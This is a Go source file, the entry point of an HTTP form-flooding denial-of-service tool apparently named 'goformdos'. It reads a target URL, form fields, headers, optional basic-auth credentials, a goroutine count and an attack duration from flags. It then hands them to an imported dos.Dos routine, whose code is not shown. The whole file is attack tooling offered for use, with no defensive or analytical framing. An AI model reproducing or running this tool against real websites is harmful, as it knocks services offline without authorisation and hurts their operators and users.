// Author: PiereLucas

package main

import (
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"

	"github.com/pierelucas/goformdos/goformdos2/configparser"
	"github.com/pierelucas/goformdos/goformdos2/dos"
)

var (
	flagForms = flag.String(
		"f",
		"",
		"File containing form names")
	flagHeaders = flag.String(
		"h",
		"",
		"File containing headers")
	flagAuth = flag.String(
		"a",
		"",
		"Basic HTTP Authentication")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
	flagLog = flag.String(
		"l",
		"",
		"logfile")
)

var (
	info dos.TargetInf
)

func validateURL(s string, done chan<- struct{}) {
	_, err := url.ParseRequestURI(s)
	if err != nil {
		log.Fatalf("%s is invalid url\n", s)
	}

	done <- struct{}{}
}

func isPath(filepath string) (bool, error) {
	_, err := os.Stat(filepath)
	if err != nil {
		return false, err
	}
	return true, err
}

func init() {
	fmt.Print("\033[H\033[2J") // clear terminal
	flag.Parse()

	if *flagForms == "" || *flagURL == "" || *flagHeaders == "" || *flagThreads <= 0 || *flagTime <= 0 {
		log.Fatalln("please define arguments or use -h for help")
	}

	if *flagLog != "" {
		b, _ := isPath(*flagLog)
		if b {
			file, err := os.OpenFile(*flagLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				log.Fatalln(err)
			}

			defer file.Close()

			log.SetOutput(file)
		} else {
			log.Fatalf("%s path not exist - unable to open or create file", *flagLog)
		}
	}

	if *flagAuth != "" {
		if !strings.Contains(*flagAuth, ":") {
			log.Fatalf("%s is not a valid username:password\n", *flagAuth)
		} else {
			tempSlice := strings.Split(*flagAuth, ":")
			info.AddAuth(tempSlice[0], tempSlice[1])
		}
	}
}

func appendToStruct(mode string, done chan<- struct{}, input map[string]string) {
	for k, v := range input {
		if mode == "FORMS" {
			info.AddForm(k, v)
		} else if mode == "HEADERS" {
			info.AddHeader(k, v)
		} else {
			log.Fatalln("error in func appendToStruct - wrong mode! [FORMS / HEADERS]")
		}
	}

	done <- struct{}{}
}

func main() {
	forms := make(map[string]string)
	headers := make(map[string]string)

	done := make(chan struct{})
	go validateURL(*flagURL, done)
	go configparser.Parse(&forms, *flagForms, done)
	go configparser.Parse(&headers, *flagHeaders, done)

	// Wait for goroutines to finish task
	for i := 0; i < 3; i++ {
		<-done
	}

	go appendToStruct("FORMS", done, forms)     // Intialize forms
	go appendToStruct("HEADERS", done, headers) // Intialize headers

	// Wait for goroutines to finish task
	for i := 0; i < 2; i++ {
		<-done
	}

	info.AddWebaddress(*flagURL) // add url to struct

	sync := make(chan struct{})
	go dos.Dos(*flagThreads, *flagTime, &info, sync)
	<-sync
}
